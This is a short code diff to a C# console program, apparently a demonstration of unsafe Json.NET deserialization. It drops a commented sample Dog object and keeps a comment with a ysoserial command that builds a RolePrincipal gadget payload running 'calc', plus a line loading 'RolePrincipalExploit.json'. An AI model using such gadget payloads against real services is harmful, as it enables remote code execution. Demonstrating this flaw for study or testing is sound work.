@@ -22,13 +22,6 @@ namespace JsonConsole
 
             string dogString = SerializeJsonObject(fido);
 
-            // {
-            // "$type": "Todo.Models.Dog, Todo.Models",
-            // "name": "Fido",
-            // "breed": "Golden Retriever",
-            // "owner": "John Doe"
-            // }
-
             // ysoserial.exe -f Json.Net -g RolePrincipal -o raw -c "calc"
             string jsonRolePrincipalPayload = File.ReadAllText("RolePrincipalExploit.json");
 
